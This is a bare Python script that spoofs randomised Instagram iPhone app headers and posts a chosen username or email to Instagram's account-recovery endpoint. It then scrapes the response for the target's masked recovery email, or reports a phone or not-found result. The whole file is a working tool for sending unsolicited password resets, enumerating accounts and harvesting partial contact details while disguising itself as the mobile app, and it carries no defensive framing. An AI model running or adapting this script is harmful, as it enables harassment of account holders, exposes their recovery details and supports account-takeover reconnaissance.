import random, re, httpx

IOS = ["15_7","16_0","16_1","16_3","16_6","17_0","17_1","17_2","17_3","17_4"]
DEV = [("iPhone14,2","iPhone 13 Pro"),("iPhone14,3","iPhone 13 Pro Max"),
       ("iPhone14,5","iPhone 13"),("iPhone15,2","iPhone 14 Pro"),
       ("iPhone15,3","iPhone 14 Pro Max"),("iPhone15,4","iPhone 15"),
       ("iPhone15,5","iPhone 15 Plus"),("iPhone16,1","iPhone 15 Pro"),
       ("iPhone16,2","iPhone 15 Pro Max")]
LOC = ["en-US,en;q=0.9","tr-TR,tr;q=0.9","en-GB,en;q=0.9","id-ID,id;q=0.9"]

def gen_ua():
    ios = random.choice(IOS); m = random.choice(DEV)
    return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 "
            f"Instagram 302.0.0.0.0 ({m[0]}; iOS {ios.replace('_','.')}; "
            f"{random.randint(1,9)}x{random.choice([3,4])})")

def gen_headers():
    return {"User-Agent": gen_ua(), "x-csrftoken": "missing",
            "accept-language": random.choice(LOC),
            "content-type": "application/x-www-form-urlencoded"}

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    try:
        with httpx.Client(http2=True, headers=gen_headers(), timeout=20) as c:
            r = c.post(URL, data={"email_or_username": target, "flow": "fxcal"})
            t = r.text
            em = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', t)
            if em: return f"email:{em.group(0)}"
            if "fail" in t.lower() or "no user found" in t.lower(): return "error:not_found"
            return "phone"
    except Exception as e:
        return f"error:{type(e).__name__}"
